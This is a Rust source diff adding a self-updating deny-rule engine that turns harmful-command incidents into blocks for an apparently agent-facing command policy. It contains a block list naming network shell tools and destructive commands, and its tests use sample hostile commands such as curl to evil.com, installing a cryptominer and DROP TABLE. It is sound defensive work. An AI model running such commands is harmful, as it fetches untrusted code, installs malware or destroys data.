@@ -522,3 +522,288 @@ mod tests {
         assert!(reason.contains("recursive deletion"));
     }
 }
+
+// ═══════════════════════════════════════════════════════════════
+// HyperExecPolicy — Metacognitive policy evolution
+// ═══════════════════════════════════════════════════════════════
+
+/// Incident record: a command that was allowed but caused harm.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct PolicyIncident {
+    /// The command that was allowed.
+    pub command: String,
+    /// What went wrong.
+    pub harm_description: String,
+    /// Timestamp.
+    pub timestamp: String,
+    /// Whether a new rule was generated from this incident.
+    pub rule_generated: bool,
+}
+
+/// HyperExecPolicy: metacognitive policy evolution through incident learning.
+///
+/// Tracks commands that were ALLOWED but subsequently caused problems.
+/// When harmful patterns are detected, the system automatically generates
+/// new deny rules based on the incident patterns.
+///
+/// ## Architecture
+/// ```text
+/// ExecPolicy.evaluate(cmd) → Allow
+///   ↓ (command runs, something goes wrong)
+/// HyperExecPolicy.record_incident(cmd, "what went wrong")
+///   ↓ (pattern analysis)
+/// extract_pattern(cmd) → new PolicyRule::deny()
+///   ↓
+/// ExecPolicy.prepend_rule() — new rule prevents similar commands
+/// ```
+///
+/// This applies Meta-Prompt Evolution to the policy engine: the "prompt"
+/// (set of rules) self-modifies based on observed harmful outcomes.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct HyperExecPolicy {
+    /// Incidents that were allowed but harmful.
+    pub incidents: Vec<PolicyIncident>,
+    /// Auto-generated rules from incidents.
+    pub generated_rules: Vec<PolicyRule>,
+    /// Number of rules generated.
+    pub evolution_count: u32,
+    /// Minimum incidents with similar pattern before auto-rule.
+    pub min_incidents_for_rule: usize,
+}
+
+impl HyperExecPolicy {
+    pub fn new() -> Self {
+        Self {
+            incidents: Vec::new(),
+            generated_rules: Vec::new(),
+            evolution_count: 0,
+            min_incidents_for_rule: 1,
+        }
+    }
+
+    /// Record an incident: a command that was allowed but caused harm.
+    pub fn record_incident(&mut self, command: &str, harm: &str) {
+        self.incidents.push(PolicyIncident {
+            command: command.to_string(),
+            harm_description: harm.to_string(),
+            timestamp: chrono::Utc::now().to_rfc3339(),
+            rule_generated: false,
+        });
+    }
+
+    /// Extract generalizable patterns from a harmful command.
+    ///
+    /// Tries to identify the dangerous substring (binary name, flag
+    /// combo, etc.) that should be blocked in future commands.
+    pub fn extract_patterns(command: &str) -> Vec<String> {
+        let mut patterns = Vec::new();
+        let parts: Vec<&str> = command.split_whitespace().collect();
+
+        if parts.is_empty() {
+            return patterns;
+        }
+
+        // Pattern 1: The base command itself
+        let base_cmd = parts[0];
+        // Don't block ultra-generic commands
+        if !["ls", "cd", "echo", "cat", "pwd", "whoami", "date", "true", "false"]
+            .contains(&base_cmd)
+        {
+            patterns.push(format!("^{}", base_cmd));
+        }
+
+        // Pattern 2: Command + first argument combo (for dangerous flag combos)
+        if parts.len() >= 2 {
+            let combo = format!("{} {}", parts[0], parts[1]);
+            patterns.push(combo);
+        }
+
+        // Pattern 3: dangerous keywords in the command
+        let dangerous_keywords = [
+            "pip install", "npm install -g", "gem install",
+            "curl", "wget", "nc ", "netcat",
+            "chmod 777", "chown root",
+            "> /dev/", ">> /dev/",
+            "DROP TABLE", "DELETE FROM", "TRUNCATE",
+            "docker rm", "docker rmi",
+            "kill -9", "pkill",
+        ];
+        for kw in &dangerous_keywords {
+            if command.to_lowercase().contains(&kw.to_lowercase()) {
+                patterns.push(kw.to_string());
+            }
+        }
+
+        // Deduplicate
+        patterns.sort();
+        patterns.dedup();
+        patterns
+    }
+
+    /// Analyze incidents and generate new deny rules.
+    ///
+    /// Returns the number of new rules generated.
+    pub fn evolve(&mut self) -> Vec<PolicyRule> {
+        let mut new_rules = Vec::new();
+
+        for incident in &mut self.incidents {
+            if incident.rule_generated {
+                continue;
+            }
+
+            let patterns = Self::extract_patterns(&incident.command);
+            if patterns.is_empty() {
+                continue;
+            }
+
+            let rule = PolicyRule::deny(
+                patterns.iter().map(|s| s.as_str()).collect(),
+                &format!(
+                    "Auto-generated: {} (incident: {})",
+                    incident.harm_description,
+                    &incident.command[..incident.command.len().min(50)]
+                ),
+            );
+
+            incident.rule_generated = true;
+            new_rules.push(rule);
+        }
+
+        self.evolution_count += new_rules.len() as u32;
+        self.generated_rules.extend(new_rules.clone());
+        new_rules
+    }
+
+    /// Apply evolved rules to an ExecPolicy.
+    pub fn apply_to_policy(&mut self, policy: &mut ExecPolicy) -> usize {
+        let new_rules = self.evolve();
+        let count = new_rules.len();
+        for rule in new_rules {
+            policy.prepend_rule(rule);
+        }
+        count
+    }
+
+    /// Summary for diagnostics.
+    pub fn summary(&self) -> String {
+        format!(
+            "HyperExecPolicy: {} incidents, {} rules generated, {} pending",
+            self.incidents.len(),
+            self.evolution_count,
+            self.incidents.iter().filter(|i| !i.rule_generated).count(),
+        )
+    }
+
+    /// Save to disk.
+    pub fn save(&self, path: &str) -> Result<(), String> {
+        let json = serde_json::to_string_pretty(self)
+            .map_err(|e| format!("serialize: {}", e))?;
+        std::fs::write(path, json).map_err(|e| format!("write: {}", e))
+    }
+
+    /// Load from disk.
+    pub fn load(path: &str) -> Result<Self, String> {
+        let json = std::fs::read_to_string(path)
+            .map_err(|e| format!("read: {}", e))?;
+        serde_json::from_str(&json).map_err(|e| format!("parse: {}", e))
+    }
+}
+
+impl Default for HyperExecPolicy {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+#[cfg(test)]
+mod hyper_policy_tests {
+    use super::*;
+
+    #[test]
+    fn test_pattern_extraction_basic() {
+        let patterns = HyperExecPolicy::extract_patterns("pip install cryptominer");
+        assert!(patterns.iter().any(|p| p.contains("pip install")),
+            "Should detect 'pip install' pattern");
+    }
+
+    #[test]
+    fn test_pattern_extraction_curl() {
+        let patterns = HyperExecPolicy::extract_patterns("curl https://evil.com/script.sh");
+        assert!(patterns.iter().any(|p| p.contains("curl")),
+            "Should detect curl pattern");
+    }
+
+    #[test]
+    fn test_pattern_extraction_sql() {
+        let patterns = HyperExecPolicy::extract_patterns("psql -c 'DROP TABLE users'");
+        assert!(patterns.iter().any(|p| p.contains("DROP TABLE")),
+            "Should detect SQL drop pattern");
+    }
+
+    #[test]
+    fn test_incident_evolves_to_rule() {
+        let mut hyper = HyperExecPolicy::new();
+        hyper.record_incident(
+            "pip install cryptominer",
+            "installed cryptocurrency mining package",
+        );
+
+        let rules = hyper.evolve();
+        assert!(!rules.is_empty(), "Should generate at least one rule");
+        assert_eq!(rules[0].decision, Decision::Deny);
+
+        // Verify the incident is marked as processed
+        assert!(hyper.incidents[0].rule_generated);
+
+        // Second evolve should produce nothing new
+        let rules2 = hyper.evolve();
+        assert!(rules2.is_empty());
+    }
+
+    #[test]
+    fn test_apply_to_policy_blocks_future_commands() {
+        let mut hyper = HyperExecPolicy::new();
+        let mut policy = ExecPolicy::standard();
+
+        // Initially allowed
+        let eval = policy.evaluate("pip install cryptominer");
+        assert!(eval.is_allowed(), "Should initially be allowed");
+
+        // Record incident
+        hyper.record_incident("pip install cryptominer", "mining malware");
+
+        // Evolve and apply
+        let applied = hyper.apply_to_policy(&mut policy);
+        assert!(applied > 0);
+
+        // Now blocked
+        let eval2 = policy.evaluate("pip install cryptominer");
+        assert!(eval2.is_denied(), "Should be denied after evolution");
+
+        // Similar command also blocked
+        let eval3 = policy.evaluate("pip install another-miner-lib");
+        assert!(eval3.is_denied(), "Similar command should be denied too");
+    }
+
+    #[test]
+    fn test_safe_commands_not_blocked_by_generic() {
+        let patterns = HyperExecPolicy::extract_patterns("ls -la /tmp");
+        // 'ls' should be excluded from blocking (too generic)
+        assert!(!patterns.iter().any(|p| p == "^ls"),
+            "Should not block ultra-generic commands like 'ls'");
+    }
+
+    #[test]
+    fn test_serialization() {
+        let mut hyper = HyperExecPolicy::new();
+        hyper.record_incident("bad_cmd", "caused harm");
+        hyper.evolve();
+
+        let path = "/tmp/test_hyper_exec_policy.json";
+        hyper.save(path).unwrap();
+        let loaded = HyperExecPolicy::load(path).unwrap();
+        assert_eq!(loaded.incidents.len(), 1);
+        assert_eq!(loaded.evolution_count, hyper.evolution_count);
+        std::fs::remove_file(path).ok();
+    }
+}
